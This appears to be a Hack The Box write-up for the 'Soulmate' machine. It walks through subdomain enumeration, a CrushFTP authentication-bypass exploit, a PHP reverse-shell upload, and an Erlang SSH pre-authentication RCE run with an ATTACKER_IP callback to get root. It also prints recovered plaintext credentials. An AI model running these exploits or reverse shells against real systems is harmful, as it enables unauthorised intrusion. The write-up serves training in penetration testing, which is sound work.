---
date: 2026-02-14T09:32:45-06:00
# description: ""
image: "/images/HTB-Soulmate/Soulmate.png"
showTableOfContents: true
tags: ["HackTheBox", "CVE-2025-31161", "CVE-2025-32433", "CrushFTP", "Erlang"]
categories: ["Writeups"]
title: "HTB: Soulmate"
type: "post"
---

* Platform: Hack The Box
* Link: [Soulmate](https://app.hackthebox.com/machines/Soulmate)
* Level: Easy
* OS: Linux
---

Soulmate features a CrushFTP instance discovered through subdomain enumeration. Vulnerability research identified `CVE-2025-31161`, which was leveraged to exploit the file transfer application. By abusing a file upload feature, we gained an initial foothold on the target system.

Post-compromise enumeration revealed a script containing valid user credentials, allowing us to pivot to another account. Further analysis uncovered an internal Erlang SSH service vulnerable to `CVE-2025-32433`, which was exploited to achieve root-level access.

This write-up also discusses an alternative, shorter exploitation path and explains why direct privilege escalation was possible in this scenario.


# Scanning

```
nmap -p- --min-rate 1000 -T4 --open -n -Pn -sC -sV -oA nmap/Soulmate {IP}
```

**Results**
```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-10 08:37 CST
Nmap scan report for 10.129.119.39
Host is up (0.10s latency).
Not shown: 51979 closed tcp ports (conn-refused), 13554 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)

80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.47 seconds
```

Nmap finds two open ports with SSH (22) and http (80). Additionally we have a redirection to `http://soulmate.htb/`.

```
sudo echo "{IP} soulmate.htb" | sudo tee -a /etc/hosts
```
# Enumeration

At `http://soulmate.htb/` we find a matchmaking application.

![Soulmate website](/images/HTB-Soulmate/soulmate_website.png)

We create an account and login. At `http://soulmate.htb/profile.php` we have the option to upload a picture which might potentially be exploitable.

![upload picture feature](/images/HTB-Soulmate/soulmate_website.png)

Directory bruteforcing is unfruitful. We only find the `assets` directory which we cannot access.
```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://soulmate.htb
```

![Soulmate directory brute forcing](/images/HTB-Soulmate/sm_gobuster.png)

![Soulmate asset directory no access](/images/HTB-Soulmate/sm_asset_noaccess.png)

With ffuf we find a subdomain `ftp`.
```
ffuf -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 100 -u http://soulmate.htb -H "Host: FUZZ.soulmate.htb" -ic -fs 154
```

![Soulmate subdomain enumeration](/images/HTB-Soulmate/sm_ffuf.png)

Visiting `http://ftp.soulmate.htb` we discover a [CrushFTP](https://www.crushftp.com/index.html) instance.

![Soulmate CrushFTP](/images/HTB-Soulmate/sm_CrushFTP.png)

Searching for vulnerabilities we find [CVE-2025-31161](https://projectdiscovery.io/blog/crushftp-authentication-bypass) with a PoC available [here](https://github.com/Immersive-Labs-Sec/CVE-2025-31161).

> This CVE was initially referenced as `CVE-2025-2825`, the name was rejected by NIST and its official number became `CVE-2025-31161`.

# Initial Foothold

Leveraging this vulnerability we can create a new user with admin privileges.

```
python3 cve-2025-31161.py --target_host ftp.soulmate.htb  --port 80 --target_user root --new_user kscorpio --password kscorpio
```

![CrushFTP auth bypass exploit](/images/HTB-Soulmate/sm_auth_exploit.png)

We then login with the created credentials.

![CrushFTP dashboard](/images/HTB-Soulmate/sm_admin.png)

We click the hamburger menu in the top-left corner and then on `Admin`.

![CrushFTP admin dashboard ](/images/HTB-Soulmate/crushftp_admin.png)

On the new page we select the hamburger menu icon again then `User Manager`.

![CrushFTP user manager](/images/HTB-Soulmate/crushftp_usermanager.png)

We see the list of all the users, we can update users' password thanks to our admin privileges.

> I changed ben's password. Do not forget to click on `Save` to confirm the password change.

![CrushFTP password update](/images/HTB-Soulmate/crushftp_pwd_update.png)

We login as `ben` and we find three folders, `webProd` contains all the website files.

![CrushFTP ben dashboard](/images/HTB-Soulmate/crushftp_ben.png)

After selecting it the `Add files` option becomes available.

![CrushFTP Add files options](/images/HTB-Soulmate/crushftp_addfiles.png)

I uploaded the web shell available at `/usr/share/webshells/php/php-reverse-shell.php` in kali Linux.

![CrushFTP reverse shell uploaded](/images/HTB-Soulmate/revshell_up_crushftp.png)

Visiting `http://soulmate.htb/rev.php` triggers the reverse shell and we get a shell as `www-data`.

![Soulmate foothold](/images/HTB-Soulmate/sm_foothold.png)

Our shell can be upgraded with the following commands
```
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm
ctrl + z  
stty raw -echo; fg
stty rows 38 columns 116
```

# Privilege Escaltion

For the system enumeration let's run [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS).

We find a few Erlang scripts which we should definitely check.

![Soulmate escript files](/images/HTB-Soulmate/sm_escript_files.png)

The `start.escript` file is a mini SSH server launcher written in Erlang. it starts an SSH daemon bound to local host on port 2222. It also logs authentication attempts, and contains hardcoded credentials.

![Soulmate ben SSH credentials](/images/HTB-Soulmate/ben_SSH_creds.png)

The `login.escript` is an SSH login auditing script. It records SSH session metadata, writes logs to `syslog` via `logger` and to `/var/log/erlang_login/session.log`.

> [logger](https://ioflood.com/blog/logger-linux-command/) is a command line tool to write messages to the system log.

We use these credentials to login via SSH as `ben`, password is `HouseH0ldings998`.

```
ssh ben@soulmate.htb
```

![Soulmate user flag](/images/HTB-Soulmate/sm_user.png)

With the same linPEAS output we see some internal ports.

![Soulmate active ports](/images/HTB-Soulmate/sm_active_ports.png)

The script mentioned an SSH server on port `2222`, let's check it. `netcat` is already installed on the target so we can attempt to grab the SSH banner locally.

```
nc 127.0.0.1 2222
```

![Erlang SSH banner](/images/HTB-Soulmate/sm_erlang_SSH.png)

A simple Google search with `SSH-2.0-Erlang/5.2.9 vulnerability` leads us to [CVE-2025-32433](https://www.sonicwall.com/blog/pre-auth-rce-alert-critical-ssh-flaw-in-erlang-otp-cve-2025-32433-) with a PoC [here](https://github.com/omer-efe-curkus/CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC).

```
python3 cve-2025-32433.py 127.0.0.1 -p 2222 --lhost <ATTACKER_IP> --lport <ATTACKER_PORT> --shell
```

![CVE-2025-32433 PoC](/images/HTB-Soulmate/sm_privesc.png)

On the listener we get a root shell

![Soulmate root shell](/images/HTB-Soulmate/sm_root.png)

## Shorter Path to root

We can actually go directly from the `www-data` shell to `root` using the same PoC.

![www-data Erlang-SSH exploit](/images/HTB-Soulmate/wwwdata_to_root.png)

On the listener we get a root shell without having to compromise  the`ben` account.

![root shell from www-data](/images/HTB-Soulmate/wwwdata_to_root2.png)

This shorter attack path is possible because `CVE-2025-32433` is a pre-authentication RCE vulnerability in the Erlang SSH daemon. It means that any local user able to reach the SSH daemon is able to exploit it (even without valid credentials).

The exploit gives a root shell because the daemon is running as `root` in the background. We can  verify this by running a few commands.

Running `ss -lntp` as `root` we see that port 2222 is owned by `beam.smp` with PID `1144`.

![Soulmate network info](/images/HTB-Soulmate/beam_PID.png)

Now let's check the owner of this process.
```
ps -p 1144 -o user,uid,cmd
```

![PID owner](/images/HTB-Soulmate/PID_owner.png)

The output confirms that the daemon is running as root.
* The user is `root`
* The UID is `0`
* It executes `/usr/local/lib/erlang_login/start.escript`

Because the vulnerable SSH service runs with root privileges, successful exploitation immediately results in root-level command execution.

> This short exploitation chain would not work if the box was updated with a fixed Erlang version or if the daemon was executed under a low-privileged user.

This is a good reminder that local-only services can also be leveraged by malicious actors once they gain a foothold on a system, and that vulnerable root-owned daemons represent clear ways to a full system compromise.





































